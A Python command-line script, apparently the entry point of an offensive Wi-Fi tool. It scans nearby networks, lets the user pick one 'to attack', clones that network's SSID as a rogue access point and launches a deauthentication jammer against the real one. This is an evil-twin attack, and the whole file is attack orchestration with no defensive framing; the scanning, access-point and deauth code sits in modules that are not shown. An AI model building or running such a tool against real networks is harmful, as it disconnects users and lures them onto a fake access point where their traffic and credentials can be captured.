import typer
from errors import NetworkError, AccessPointError, JammerError
from network_scanner import scanner
from access_point import setup
from jammer import deauth

app = typer.Typer()
@app.command()

def start():
    interface = typer.prompt("[?] What interface do you want to use? (default: wlan0)", default="wlan0")
    if not interface.strip():
        raise NetworkError("[!] Invalid interface")
    
    typer.echo("[+] Starting wifi scanning")
    networks = scanner(interface)
    
    if not networks:
        raise NetworkError("[!] No network found")
    else: typer.echo("[+] Found networks:")
    
    for i, net in enumerate(networks):
        typer.echo(f"  - {i+1}: SSID: {net['SSID']} | BSSID: {net['BSSID']} | Channel: {net['Channel']}")    
    typer.echo("[+] Finished wifi scanning")
    
    networks_choice = typer.prompt("[+] Select the network to attack", type=int)
    if (networks_choice < 1 or networks_choice > len(networks)):
        raise ValueError("[!] Invalide choice")
    else:
        target = networks[networks_choice - 1]
        typer.echo(f"[+] Network selected: SSID: {target['SSID']} | BSSID: {target['BSSID']} | Channel: {target['Channel']}")
    

    typer.echo("[...] Access point initialization")
    try:
        setup(target['SSID'], interface, target['Channel'])
    except AccessPointError as error:
        raise AccessPointError(f"[!] Unexpected error during access point initialization: {error}")
    
    
    typer.echo("[...] Jammmer initialization")
    try:
        deauth(target['BSSID'], interface)
    except JammerError as error:
        raise JammerError(f"[!] Unexpected error durign jammer initialization: {error}")
    
    
if __name__ == "__main__":
    start()